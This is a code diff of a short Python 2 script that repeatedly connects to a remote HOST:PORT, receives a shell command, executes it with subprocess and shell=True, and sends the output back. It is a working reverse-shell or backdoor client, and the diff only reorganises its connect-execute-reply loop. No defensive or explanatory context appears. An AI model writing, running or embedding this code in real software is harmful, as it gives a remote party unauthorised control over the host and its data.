@@ -20,17 +20,16 @@ def main():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             s.connect((HOST, PORT))
+            cmd = s.recv(SIZE)
+            print '[+] ({}) Executing "{}"'.format(datetime.datetime.now(),
+                                                   cmd)
+            stdout = subprocess.Popen(cmd, stdout=subprocess.PIPE,
+                                      shell=True).communicate()[0]
+            s.send(stdout)
         except socket.error:
             print '[!] ({}) Could not connect to server. Waiting...'.format(datetime.datetime.now())
+        finally:
             time.sleep(DELAY)
-            continue
-        cmd = s.recv(SIZE)
-
-        print '[+] ({}) Executing "{}"'.format(datetime.datetime.now(), cmd)
-        stdout = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True).communicate()[0]
-        s.send(stdout)
-
-        time.sleep(DELAY)
 
 if __name__ == '__main__':
     main()
